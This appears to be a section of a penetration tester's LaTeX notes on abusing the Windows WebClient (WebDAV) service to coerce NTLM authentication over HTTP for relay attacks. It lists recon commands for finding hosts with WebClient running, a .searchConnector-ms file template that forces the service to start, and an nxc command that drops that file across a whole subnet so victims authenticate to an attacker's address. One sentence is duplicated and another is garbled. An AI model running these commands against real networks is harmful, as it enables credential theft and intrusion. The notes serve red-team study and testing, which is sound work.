\section{WebClient abuse (WebDAV)}
The WebClient service needs to be enabled for WebDAV-based programs and features to work. As it turns out, the WebClient service can be indirectly abused by attackers to coerce authentications.

This technique needs to be combined with other coercion techniques (e.g. PetitPotam, PrinterBug) to act as a booster for these techniques. {It allows attackers to elicit authentications made over HTTP instead of SMB}, hence heightening NTLM relay capabilities.

It allows attackers to elicit authentications made over HTTP instead of SMB, hence heightening NTLM relay capabilities.

\subsection{Recon}

\begin{verbatim}
nxc smb 172.16.10.3 -d <domain_fqdn> -u <user> -p <password> -M webdav

webclientservicescanner <domain_fqdn>/<user>:<password>@<target_fqdn>

GetWebDAVStatus.exe 'machine'
\end{verbatim}

\subsection{Attack force to start}

A \href{https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry}{.searchConnector-ms} file is a special file used to link the computer's search function to particular web services or databases. Like installing a new search engine to a computer, it allows one to quickly find information from that source without launching a web browser or additional software. What makes this type of file useful for our purpose is that it can help us to force the remote computer to enable the WebClient service in case it is disabled and allows us, eventually, to force HTTP authentication.

structure of a \verb+.searchConnector-ms+ file:
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription
xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
<description>Microsoft Outlook</description>
<isSearchOnlyItem>false</isSearchOnlyItem>
<includeInStartMenuScope>true</includeInStartMenuScope>
<templateInfo>
<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
</templateInfo>
<simpleLocation>
<url>https://whatever/</url>
</simpleLocation>
</searchConnectorDescription>
\end{verbatim}


the \verb+https+ is very important or not. 
\begin{verbatim}
nxc smb 172.16.0.0/24 -u jubeaz -p jubeaz \
    -M drop-sc -o URL=https://192.168.2.3/jubeaz FILENAME=@secrets
\end{verbatim}



